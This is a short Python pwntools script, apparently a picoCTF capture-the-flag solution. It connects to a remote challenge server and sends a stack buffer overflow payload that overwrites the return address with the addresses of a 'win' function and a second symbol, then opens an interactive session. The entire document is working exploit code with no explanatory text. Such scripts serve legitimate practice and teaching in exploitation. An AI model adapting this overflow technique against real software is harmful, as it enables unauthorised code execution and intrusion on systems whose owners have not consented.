from pwn import *

p = remote('saturn.picoctf.net', 56626)
# p = process('./vuln')
e = ELF('./vuln')

payload = b'A' * 0xe
payload += p32(e.symbols['win'])
payload += p32(e.symbols['UnderConstruction'])

p.sendline(payload)
p.interactive()
